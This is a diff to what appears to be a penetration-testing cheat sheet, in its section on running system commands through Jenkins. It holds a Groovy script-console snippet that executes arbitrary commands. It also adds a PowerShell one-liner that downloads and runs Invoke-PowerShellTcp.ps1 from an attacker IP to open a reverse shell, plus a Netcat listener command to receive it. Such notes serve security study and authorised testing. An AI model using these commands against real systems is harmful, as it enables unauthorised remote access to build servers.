@@ -1857,16 +1857,17 @@ Note: In the Windows environment, numerous enterprise applications often require
 #### Jenkins
 You can run system commands. There are many ways to do it:
 - With plugins installed (from [CRTP](https://www.alteredsecurity.com/adlab))
-- With admin access, go to `http://<jenkins_server>/script` and run the following:
-  ```PowerShell
-  def sout = new StringBuffer(), serr = new StringBuffer()
-  def proc = '
-  [INSERT COMMAND]'.execute()
-  proc.consumeProcessOutput(sout, serr)
-  proc.waitForOrKill(1000)
-  println "out> $sout err> $serr"
-  ```
-- If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter: `powershell -c <command>`
+  - With admin access, go to `http://<jenkins_server>/script` and run the following:
+    ```PowerShell
+    def sout = new StringBuffer(), serr = new StringBuffer()
+    def proc = '
+    [INSERT COMMAND]'.execute()
+    proc.consumeProcessOutput(sout, serr)
+    proc.waitForOrKill(1000)
+    println "out> $sout err> $serr"
+    ```
+- If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter: `powershell -c <command>`, or `powershell iex (iwr -UseBasicParsing http://<IP>/Invoke-PowerShellTcp.ps1);Power -Reverse -IPAddress <IP> -Port <PORT>`
+- Use a listener like Netcat `nc64.exe -lvp 443`
 
 
 ## Buffer Overflow
